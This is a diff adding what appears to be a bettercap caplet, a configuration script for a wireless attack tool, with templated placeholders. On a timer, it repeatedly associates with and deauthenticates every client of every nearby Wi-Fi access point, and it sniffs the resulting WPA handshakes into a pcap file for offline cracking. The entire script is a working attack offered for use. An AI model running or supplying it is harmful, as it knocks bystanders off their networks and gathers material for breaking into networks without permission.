@@ -1,0 +1,29 @@
+# make sure wlanX is in monitor mode (X is some number)
+
+# set location
+set wifi.handshakes.file DATE_PH
+# ignore my bssids (for local hacks)
+set wifi.deauth.skip 
+set wifi.assoc.skip 
+# every TCKR_PH seconds:
+# - clear the screen
+# - show the list of nearby access points 
+# - deauth every client from each one of them
+set ticker.period TCKR_PH
+set ticker.commands 'clear; wifi.show; wifi.assoc all; sleep 2 && wifi.deauth all;'
+# sniff EAPOL frames ( WPA handshakes ) and save them to a pcap file.
+set net.sniff.verbose true
+set net.sniff.filter ether proto 0x888e
+set net.sniff.output wpa.pcap
+
+# uncomment to only hop on these channels:
+# wifi.recon.channel 1,2,3
+wifi.recon on
+ticker on
+net.sniff on
+
+# we'll see lots of probes after each deauth, just skip the noise ...
+events.ignore wifi.client.probe
+# start fresh
+events.clear
+clear
